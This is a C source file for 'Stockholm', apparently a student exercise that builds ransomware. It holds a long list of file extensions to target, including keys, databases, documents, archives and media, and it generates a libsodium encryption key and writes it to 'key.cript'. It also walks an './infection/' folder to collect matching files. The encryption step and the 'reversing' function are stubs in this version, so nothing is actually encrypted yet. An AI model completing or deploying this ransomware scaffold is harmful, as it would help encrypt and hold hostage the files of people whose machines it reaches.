#include "stockholm.h"

const char *extensions[] = {
    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw",
    ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
    ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm",
    ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb",
    ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln",
    ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1",
    ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb",
    ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg",
    ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv",
    ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff",
    ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso",
    ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2",
    ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti",
    ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123",
    ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst",
    ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt",
    ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls",
    ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc", 0
};

void	version(void)
{
	printf("Stockholm version %s\n", STOCKHOLM_VERSION);
}

void	help(void)
{
	printf("%s", HELP);
}

void	writeKey(void)
{
	unsigned long int key_size = crypto_secretbox_KEYBYTES;
	unsigned char key[key_size];
	crypto_secretbox_keygen(key);

	FILE *fp = fopen("key.cript", "wb");

	if (fp == NULL)
	{
		printf("Error: fopen() failed\n");
		return ;
	}
	fwrite(key, sizeof(unsigned char), key_size, fp);
	fclose(fp);
}

void	clearlist(struct linkedFile **toclear)
{
	if (toclear == 0)
		return ;
	struct linkedFile *savef;
	while (*toclear)
	{
		savef = *toclear;
		*toclear = (*toclear)->next;
		free(savef);
	}
}

void	addback_node(struct linkedFile **node, char filename[256])
{
	if (!filename)
		return ;
	if (!*node || !node)
	{
		(*node) = malloc(sizeof(struct linkedFile));
		strcpy((*node)->file, filename);
		(*node)->next = NULL;
		return ;
	}
	struct linkedFile *new = malloc(sizeof(struct linkedFile));
	if (new == 0)
		return ;
	strcpy(new->file, filename);
	new->next = NULL;
	struct linkedFile *fnode = *node;
	while ((*node)->next && *node)
		*node = (*node)->next;
	(*node)->next = new;
	*node = fnode;
}

int	valid_extension(char *file)
{
	int	ext = strlen(file);
	while (ext != 0 && file[ext] != '.')
		ext--;
	if (ext == 0)
		return (1);
	for (int i = 0; extensions[i]; i++)
		if (strcmp(extensions[i], file + ext) == 0)
			return (1);
	// printf("ext : %s\n", file + ext);
	return (0);
}

struct linkedFile	*openFile(void)
{
	DIR *dr;
	struct dirent *en;
	dr = opendir("./infection/"); //open all directory
	if (dr == 0)
		return NULL;
	struct linkedFile *node = NULL;
	while ((en = readdir(dr)) != NULL) {
		if (strlen(en->d_name) > 2 && valid_extension(en->d_name))
			addback_node(&node, en->d_name);
	}
	closedir(dr); //close all directory
	return node;
}

void	reversing(char *decrypt)
{
	(void)decrypt;
}

int	optionprog(char *option, int argc)
{
	int noarg = argc == 2;
	if ((strcmp("-h", option) == 0 || strcmp("--help", option) == 0) && noarg)
	{
		help();
		return (0);
	}
	
	if ((strcmp("-v", option) == 0 || strcmp("--version", option) == 0) && noarg)
	{
		version();
		return (0);
	}
	
	if ((strcmp("-r", option) == 0 || strcmp("--reverse", option) == 0) && !noarg)
		return (1);
	
	printf("%s", DEFAULT_HELP);	
	return (0);
}

int		main(int argc, char *argv[], char *env[])
{
	(void)env;
	if (argc > 3)
	{
		printf("%s", DEFAULT_HELP);
		exit(0);
	}
	if (argc > 1)
	{
		if (optionprog(argv[1], argc))
			reversing(argv[2]);
		return (0);
	}
	if (sodium_init() == -1)
	{
		printf("Error: sodium_init() failed\n");
		return (1);
	}
	writeKey(); // write key encrypt in key.cript "."

	struct linkedFile *file = openFile();
	// for (struct linkedFile *tmp = file; tmp; tmp = tmp->next)
		// printf("name : %s\n", tmp->file);
	
	clearlist(&file);
	return (0);
}